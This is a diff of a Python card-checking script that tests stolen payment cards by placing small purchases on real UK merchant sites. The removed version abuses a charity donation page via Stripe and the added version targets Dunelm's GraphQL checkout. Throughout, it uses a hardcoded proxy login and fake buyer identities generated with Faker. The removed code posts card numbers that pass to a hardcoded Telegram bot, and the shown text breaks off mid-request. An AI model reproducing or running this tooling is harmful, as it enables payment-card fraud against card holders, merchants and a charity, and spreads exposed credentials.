@@ -1,240 +1,550 @@
-#=========================library==================================#
-import requests , re , random , string , uuid , user_agent , base64 , time
-from requests_toolbelt.multipart.encoder import MultipartEncoder
+import requests, re, base64, random, string, user_agent, time
+from faker import Faker
 from colorama import Fore, Back, Style, init
+import random , time , os
 from bs4 import BeautifulSoup
-from nextcaptcha import NextCaptchaAPI 
-import logging
-from urllib.parse import unquote
+import requests
 import json
-#=========================library==================================#
+import base64
+import hashlib
+import random
+import socket
+import re
+import uuid
+from datetime import datetime
+from bs4 import BeautifulSoup
+import user_agent
+from faker import Faker
 
-
-#=============================toools===============================#
-
-#============================checker===============================#
 def Tele(ccx):
     ccx = ccx.strip().split('\n')[0]
-    n = ccx.split("|")[0]
+    nn = ccx.split("|")[0]
     mm = ccx.split("|")[1]
     yy = ccx.split("|")[2]
     cvc = ccx.split("|")[3]
 
     if "20" in yy:
         yy = yy.split("20")[1]
-    username = "pcZ9DikmY6-res-any"
-    password = "PC_7q0GZZMMdvBLD388B"
-    proxy = "proxy.rapidseedbox.com:5959"
-    proxies = {
-        "http": f"http://{username}:{password}@{proxy}",
-        "https": f"http://{username}:{password}@{proxy}"
-    }
-    r = requests.Session()
-    r.proxies.update(proxies)
-    user = user_agent.generate_user_agent()
-    def	 name():
-        name = ''.join(random.choices(string.ascii_lowercase, k=6))	
-        return f"{name}"	
-    first = (name())
-    last = (name())
-    con = (name())
-    def acc():
-        name = ''.join(random.choices(string.ascii_lowercase, k=20))
-        number = ''.join(random.choices(string.digits, k=4))
-        return f"{name}{number}@gmail.com"
-    acc = (acc())
-    GUID = uuid.uuid4()
-    MUID = uuid.uuid4()
-    SID = uuid.uuid4()
-    init(autoreset=True)
-    time.sleep(10)
-    headers = {
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
-        'Cache-Control': 'max-age=0',
-        'Connection': 'keep-alive',
-        'If-Modified-Since': 'Tue, 18 Feb 2025 14:46:27 GMT',
-        'If-None-Match': '"57c9e7e01f78c0112658b131a5f871b0"',
-        'Referer': 'https://shop.mstrust.org.uk/donations/',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-User': '?1',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': user,
-        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
+    try:
+        faker = Faker()
+        ua = user_agent.generate_user_agent()
+        acc = faker.user_name() + "@gmail.com" 
+        first_name = faker.first_name()  
+        last_name = faker.last_name()  
+        phone = faker.phone_number()
+        username = "pcZ9DikmY6-res-any"
+        password = "PC_7q0GZZMMdvBLD388B"
+        proxy = "proxy.rapidseedbox.com:5959"
+        proxies = {
+                        "http": f"http://{username}:{password}@{proxy}",
+                        "https": f"http://{username}:{password}@{proxy}"
+                    }
+        r = requests.Session()
+        r.proxies.update(proxies)
+        ip_response = r.get("http://httpbin.org/ip", timeout=10)
+        ip_data = ip_response.json().get("origin", "غير معروف")
+        if nn.startswith('4'):
+            card_type = 'visa'
+        elif nn.startswith('5'):
+            card_type = 'mc'
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'priority': 'u=0, i',
+            'referer': 'https://www.dunelm.com/category/offers/all-offers',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': ua,
+        }
 
-    response = r.get('https://shop.mstrust.org.uk/donations/donate-5/', headers=headers)
-    headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://shop.mstrust.org.uk',
-        'Referer': 'https://shop.mstrust.org.uk/donations/donate-5/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': user,
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
+        params = {
+            'defaultSkuId': '30906900',
+        }
 
-    params = {
-        'wc-ajax': 'xoo_wsc_add_to_cart',
-    }
+        response = r.get(
+            'https://www.dunelm.com/product/simply-brushed-cotton-standard-pillowcase-pair-1000246081',
+            params=params,
+            headers=headers,
+        )
+        time.sleep(10)
 
-    data = {
-        'quantity': '1',
-        'gtm4wp_product_data': '{"internal_id":245,"item_id":"GG05","item_name":"Donate \\u00a35","sku":"GG05","price":5,"stocklevel":null,"stockstatus":"instock","google_business_vertical":"retail","item_category":"Donations","id":"GG05"}',
-        'add-to-cart': '245',
-        'action': 'xoo_wsc_add_to_cart',
-    }
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
 
-    response = r.post('https://shop.mstrust.org.uk/', params=params, headers=headers, data=data)
+        json_data = {
+            'query': '\n  mutation AddProduct($basketId: ID!, $sku: String!, $quantity: Int!) {\n    addProduct(basketId: $basketId, sku: $sku, quantity: $quantity) {\n      basket {\n        ...basketAttributes\n      }\n      notifications {\n        ...notificationAttributes\n      }\n    }\n  }\n  \n  fragment basketAttributes on Basket {\n    id\n    orderId\n    expiresAt\n    prices {\n      subtotal\n      total\n      voucherDiscount\n      deliveryDiscount\n    }\n    products {\n      ...productAttributes\n    }\n    vouchers {\n      code\n      title\n    }\n  }\n  \n  fragment productAttributes on BasketProduct {\n    basketQuantity\n    clickAndCollectEligible\n    imageUrl\n    itemId\n    itemName\n    partCode\n    productName\n    productId\n    productName\n    productUrl\n    sellPriceTaxed\n    subtotal\n    sampleType\n    sampleGroup\n    maxSamplesPerOrderAndGroup\n    ageRestricted\n  }\n\n\n  \n  fragment notificationAttributes on BasketNotification {\n    type\n    sku\n    reason\n    additionalData {\n      stockQuantity\n    }\n  }\n\n',
+            'variables': {
+                'basketId': '63d6f7b9-6329-48a3-8570-1237dd730ce9',
+                'sku': '30906900',
+                'quantity': 1,
+                'addedSku': {
+                    'id': '30906900',
+                    'inStock': True,
+                    'isDiscontinued': False,
+                    'media': {
+                        'image': [
+                            '30906900.jpg',
+                            '30906900_alt01.jpg',
+                            '30906900_alt02.jpg',
+                            '30906900_alt04.jpg',
+                            '30906900_alt05.jpg',
+                        ],
+                        'youtubeId': '',
+                    },
+                    'price': {
+                        'now': 2,
+                        'was': 4,
+                        'history': [
+                            {
+                                'value': 4,
+                                'date': 'February 2024',
+                            },
+                            {
+                                'value': 3.2,
+                                'date': 'December 2024',
+                            },
+                            {
+                                'value': 2.8,
+                                'date': 'December 2024',
+                            },
+                        ],
+                    },
+                    'rating': {
+                        'averageRating': 4.6,
+                        'totalCount': 44,
+                    },
+                    'sampleSkus': [],
+                    'crossSellAssociations': [],
+                    'crossSellSortOrder': '',
+                    'colourGroup': 'Yellow',
+                    'definingAttributes': {
+                        'colour': 'Yellow-Ochre',
+                    },
+                    'isReturnable': True,
+                    'name': 'Simply Brushed Std Pcase Pr Ochre',
+                    'isConsciousChoice': False,
+                },
+            },
+            'operationName': 'AddProduct',
+        }
 
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
+        try:
+            basket_id = re.search(r'"id":"([a-f0-9-]+)"', response.text).group(1)
+            product_id = re.search(r'"productId":"(\d+)"', response.text).group(1)
+        except:
+            pass
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sas-use-cache': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
 
+        json_data = {
+            'operationName': 'CheckoutView',
+            'variables': {},
+            'query': 'query CheckoutView {\n  viewer {\n    __typename\n    checkoutProvisionalOrder {\n      __typename\n      ...ProvisionalOrder\n      customer {\n        __typename\n        emailAddress\n        addresses {\n          __typename\n          home {\n            ...Address\n            __typename\n          }\n          billing {\n            ...Address\n            __typename\n          }\n          pudoLocation {\n            ...Address\n            __typename\n          }\n        }\n      }\n    }\n  }\n}\n\nfragment CheckoutOrderline on CheckoutOrderline {\n  skuCode\n  quantity\n  unitPrice\n  totalPrice\n  onOrBy\n  delivered\n  elapsed\n  customerPromiseDate\n  carrier\n  labels\n  quote {\n    __typename\n    quoteId\n  }\n  store {\n    __typename\n    sapSiteId\n    name\n    uri\n    streetAddress\n    localArea\n    city\n    county\n    postcode\n    country\n    phone\n    staticMapUrl\n    ccCheckInType\n    location {\n      __typename\n      lat\n      lon\n    }\n    tillTimes\n    openingHours {\n      __typename\n      day\n      open\n      close\n    }\n    facilities {\n      __typename\n      facilityIcon\n      facility\n    }\n    seoText {\n      __typename\n      facility\n      facilityIcon\n      type\n      text\n      spans {\n        __typename\n        start\n        end\n        type\n      }\n    }\n  }\n  skuDetails {\n    __typename\n    name\n    imageUrl\n    skuDefiningValues\n    productName\n  }\n  customProduct\n  customProperties {\n    madeToMeasure {\n      widthInCentimeters\n      lengthInCentimeters\n      totalMeterage\n      midRailInCentimeters\n      display {\n        width\n        length\n        unitOfMeasure\n        midRailUnitOfMeasure\n        options {\n          recess\n          controlSide\n          chainColour\n          rollDirection\n          bracketType\n          controlType\n          stackSide\n          bottomWeightType\n          eyeletColour\n          dressSide\n          singlePair\n          frame\n          frameSides\n          hardwareColour\n          louvreSize\n          numberOfPanels\n          panelConfiguration\n          midRail\n          midRailPosition\n          __typename\n        }\n        __typename\n      }\n      options {\n        recess\n        controlSide\n        chainColour\n        rollDirection\n        bracketType\n        controlType\n        stackSide\n        bottomWeightType\n        eyeletColour\n        dressSide\n        singlePair\n        frame\n        frameSides\n        hardwareColour\n        louvreSize\n        numberOfPanels\n        panelConfiguration\n        midRail\n        midRailPosition\n        __typename\n      }\n      __typename\n    }\n    fitting {\n      isSelected\n      durationInHours\n      numberOfWindows\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment Address on Address {\n  id\n  addressCode\n  lastName\n  city\n  addressType\n  county\n  postcode\n  title\n  firstName\n  phoneNumber\n  countryCode\n  line1\n  line2\n  line3\n  __typename\n}\n\nfragment ProvisionalOrder on CheckoutProvisionalOrder {\n  provisionalOrderId\n  preferredDeliveryMethod\n  expiryDate\n  cc {\n    __typename\n    itemCount\n    lines {\n      ...CheckoutOrderline\n      __typename\n    }\n    collections {\n      __typename\n      lines {\n        ...CheckoutOrderline\n        __typename\n      }\n    }\n  }\n  hd {\n    __typename\n    itemCount\n    lines {\n      ...CheckoutOrderline\n      __typename\n    }\n    deliveries {\n      type\n      onOrBy\n      date\n      fulfilmentType\n      deliveryCharge\n      isDeliveryCallRequired\n      groupId\n      otherOptions {\n        type\n        date\n        deliveryCharge\n        __typename\n      }\n      lines {\n        ...CheckoutOrderline\n        __typename\n      }\n      __typename\n    }\n    deliveryCharges {\n      type\n      charge\n      __typename\n    }\n  }\n  flags {\n    paymentRequired\n    isDeliveryFree\n    checkoutComplete\n    __typename\n  }\n  voucher {\n    __typename\n    basketDiscount\n    discountedDeliveryCharges {\n      discountedAmount\n      originalCharge\n      type\n      __typename\n    }\n    code\n    description\n  }\n  prices {\n    __typename\n    delivery\n    subtotal\n    orderLinesPayable\n    total\n  }\n  promises {\n    sku\n    available\n    promises {\n      ... on Delivery {\n        __typename\n      }\n      ... on HomeDelivery {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on Standard {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on NominatedDay {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on Express {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on ClickAndCollect {\n        available\n        stores {\n          sapSiteId\n          availability {\n            sku\n            quantity\n            stock\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n',
+        }
 
-
-    headers = {
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
-        'Cache-Control': 'max-age=0',
-        'Connection': 'keep-alive',
-        'Referer': 'https://shop.mstrust.org.uk/donations/donate-5/',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-User': '?1',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': user,
-        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    response = r.get('https://shop.mstrust.org.uk/checkout/', headers=headers)
-    sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
-    giftaid_order_security = re.search(r'name="giftaid_order_security" value="(.*?)"', response.text).group(1)
-    check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
-    headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://shop.mstrust.org.uk',
-        'Referer': 'https://shop.mstrust.org.uk/checkout/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': user,
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    params = {
-        'wc-ajax': 'update_order_review',
-    }
-
-    data = f'security={sec}&payment_method=stripe&country=PR&state=&postcode=00601-0017&city=Adjuntas&address=37+Calle+Munoz+Rivera+Unit+1040&address_2=&s_country=PR&s_state=&s_postcode=00601-0017&s_city=Adjuntas&s_address=37+Calle+Munoz+Rivera+Unit+1040&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fshop.mstrust.org.uk%252Fdonations%252Fdonate-5%252F%26wc_order_attribution_session_start_time%3D2025-02-18%252014%253A44%253A30%26wc_order_attribution_session_pages%3D7%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F133.0.0.0%2520Safari%252F537.36%26billing_first_name%3D{first}%26billing_last_name%3D{last}%26billing_company%3D%26billing_country%3DPR%26billing_address_1%3D37%2520Calle%2520Munoz%2520Rivera%2520Unit%25201040%26billing_address_2%3D%26billing_city%3DAdjuntas%26billing_state%3D%26billing_postcode%3D00601-0017%26billing_phone%3D9195157621%26billing_email%3D{acc}%26account_password%3D%26health_care_professional%3D%26giftaid_order_security%3D8fa177359c%26_wp_http_referer%3D%252Fcheckout%252F%26order_comments%3D%26ign-donation%3D0%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F'
-
-    response = r.post('https://shop.mstrust.org.uk/', params=params, headers=headers, data=data)
-    headers = {
-        'accept': 'application/json',
-        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'priority': 'u=1, i',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': user,
-    }
-
-    data = f'billing_details[name]={first}+{last}&billing_details[email]={acc}&billing_details[phone]=9195157621&billing_details[address][city]=Adjuntas&billing_details[address][country]=PR&billing_details[address][line1]=37+Calle+Munoz+Rivera+Unit+1040&billing_details[address][line2]=&billing_details[address][postal_code]=00601-0017&billing_details[address][state]=&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fd72854d2f1%3B+stripe-js-v3%2Fd72854d2f1%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.mstrust.org.uk&time_on_page=17979&client_attribution_metadata[client_session_id]=7db8446e-8d96-41d8-a4a2-c33eba9f556f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid={GUID}&muid={MUID}&sid={SID}&key=pk_live_51OHqUeFpDeX1uGTmiU389WkEYsTwDJRPRNCvVDdsnEmQiQhYi2ZspwHXbbNJ7LE0PyQ28YqRxF54mQyRi1coTip9007xOT91Z4&_stripe_version=2024-06-20'
-
-    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-    id = response.json()['id']
-    headers = {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://shop.mstrust.org.uk',
-        'Referer': 'https://shop.mstrust.org.uk/checkout/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': user,
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    params = {
-        'wc-ajax': 'checkout',
-    }
-
-    data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fshop.mstrust.org.uk%2Fdonations%2Fdonate-5%2F&wc_order_attribution_session_start_time=2025-02-18+14%3A44%3A30&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.0.0+Safari%2F537.36&billing_first_name={first}&billing_last_name={last}&billing_company=&billing_country=PR&billing_address_1=37+Calle+Munoz+Rivera+Unit+1040&billing_address_2=&billing_city=Adjuntas&billing_state=&billing_postcode=00601-0017&billing_phone=9195157621&billing_email={acc}&account_password=&health_care_professional=&giftaid_order_security={giftaid_order_security}&_wp_http_referer=%2Fcheckout%2F&marketing_preferences_post=yes&marketing_preferences_email=yes&are_you_over_18=I+am+16+or+older&order_comments=&ign-donation=0&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method={id}'
-
-    response = r.post('https://shop.mstrust.org.uk/', params=params, headers=headers, data=data)
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
 
 
 
-    result2 = response.text
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'priority': 'u=0, i',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-site',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': ua,
+        }
 
-    if "success" in result2 or "succeeded" in result2:
-        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
+        response = r.get('https://www.dunelm.com/checkout?chkgst:true', headers=headers)
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'authorization': 'null',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sas-use-cache': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
+
+        json_data = {
+            'operationName': 'GetBasket',
+            'variables': {
+                'basketId': basket_id,
+            },
+            'query': 'query GetBasket($basketId: ID!) {\n  getBasket(basketId: $basketId) {\n    basket {\n      ...basketAttributes\n      __typename\n    }\n    notifications {\n      ...notificationAttributes\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment basketAttributes on Basket {\n  id\n  orderId\n  expiresAt\n  prices {\n    subtotal\n    total\n    voucherDiscount\n    deliveryDiscount\n    __typename\n  }\n  products {\n    ...productAttributes\n    __typename\n  }\n  vouchers {\n    code\n    title\n    __typename\n  }\n  __typename\n}\n\nfragment productAttributes on BasketProduct {\n  id\n  basketQuantity\n  clickAndCollectEligible\n  imageUrl\n  itemId\n  itemName\n  partCode\n  productName\n  productId\n  productName\n  productUrl\n  sellPriceTaxed\n  subtotal\n  sampleType\n  sampleGroup\n  maxSamplesPerOrderAndGroup\n  ageRestricted\n  quoteIds\n  customProduct\n  customProperties {\n    madeToMeasure {\n      totalMeterage\n      widthInCentimeters\n      lengthInCentimeters\n      midRailInCentimeters\n      display {\n        width\n        length\n        unitOfMeasure\n        midRailUnitOfMeasure\n        options {\n          recess\n          controlSide\n          rollDirection\n          chainColour\n          bracketType\n          controlType\n          stackSide\n          bottomWeightType\n          eyeletColour\n          singlePair\n          dressSide\n          installationHeight\n          frame\n          frameSides\n          hardwareColour\n          louvreSize\n          numberOfPanels\n          panelConfiguration\n          midRail\n          midRailPosition\n          __typename\n        }\n        __typename\n      }\n      options {\n        recess\n        controlSide\n        rollDirection\n        chainColour\n        bracketType\n        controlType\n        stackSide\n        bottomWeightType\n        eyeletColour\n        singlePair\n        dressSide\n        installationHeight\n        frame\n        frameSides\n        hardwareColour\n        louvreSize\n        numberOfPanels\n        panelConfiguration\n        midRail\n        midRailPosition\n        __typename\n      }\n      __typename\n    }\n    fitting {\n      isSelected\n      durationInHours\n      numberOfWindows\n      __typename\n    }\n    __typename\n  }\n  services {\n    id\n    type\n    __typename\n  }\n  service {\n    type\n    __typename\n  }\n  product {\n    id\n    __typename\n  }\n  __typename\n}\n\nfragment notificationAttributes on BasketNotification {\n  type\n  sku\n  reason\n  additionalData {\n    stockQuantity\n    stockOldQuantity\n    __typename\n  }\n  customProperties {\n    madeToMeasure {\n      totalMeterage\n      widthInCentimeters\n      lengthInCentimeters\n      midRailInCentimeters\n      display {\n        width\n        length\n        unitOfMeasure\n        midRailUnitOfMeasure\n        options {\n          recess\n          controlSide\n          rollDirection\n          chainColour\n          bracketType\n          controlType\n          stackSide\n          bottomWeightType\n          eyeletColour\n          installationHeight\n          frame\n          frameSides\n          hardwareColour\n          louvreSize\n          numberOfPanels\n          panelConfiguration\n          midRail\n          midRailPosition\n          __typename\n        }\n        __typename\n      }\n      options {\n        recess\n        controlSide\n        rollDirection\n        chainColour\n        bracketType\n        controlType\n        stackSide\n        bottomWeightType\n        eyeletColour\n        installationHeight\n        frame\n        frameSides\n        hardwareColour\n        louvreSize\n        numberOfPanels\n        panelConfiguration\n        midRail\n        midRailPosition\n        __typename\n      }\n      __typename\n    }\n    fitting {\n      isSelected\n      durationInHours\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n',
+        }
+
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sas-use-cache': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
+
+        json_data = {
+            'operationName': 'CheckoutBasket',
+            'variables': {
+                'basketId': basket_id,
+                'preferredDeliveryMethod': 'homeDelivery',
+                'orderSource': 'WEB',
+            },
+            'query': 'mutation CheckoutBasket($basketId: ID, $preferredDeliveryMethod: PreferredDeliveryMethod!, $clickAndCollectLocationCode: String, $orderSource: String, $hdOnlySkus: [String], $ccOnlySkus: [String]) {\n  checkoutBasket(input: {basketId: $basketId, preferredDeliveryMethod: $preferredDeliveryMethod, clickAndCollectLocationCode: $clickAndCollectLocationCode, orderSource: $orderSource, hdOnlySkus: $hdOnlySkus, ccOnlySkus: $ccOnlySkus}) {\n    provisionalOrderId\n    __typename\n  }\n}\n',
+        }
+
+        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/json',
+            'origin': 'https://www.dunelm.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.dunelm.com/',
+            'sas-use-cache': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': ua,
+        }
+
+        json_data = {
+            'operationName': 'UpdateProvisionalOrder',
+            'variables': {
+                'updateProvisionalOrderDetailsInput': {
+                    'emailAddress': acc,
+                    'deliveryAddress': {
+                        'id': basket_id,
+                        'lastName': first_name,
+                        'firstName': last_name,
+                        'title': 'mrs',
+                        'phoneNumber': '0433656463',
+                        'city': 'Melton Mowbray',
+                        'postcode': 'LE13 9EE',
+                        'countryCode': 'GB',
+                        'line1': 'Po Box 10080',
+                        'line2': None,
+                        'line3': None,
+                    },
+                    'billingAddress': {
+                        'id': basket_id,
+                        'line1': 'Po Box 10080',
+                        'line2': None,
+                        'line3': None,
+                        'city': 'Melton Mowbray',
+                        'countryCode': 'GB',
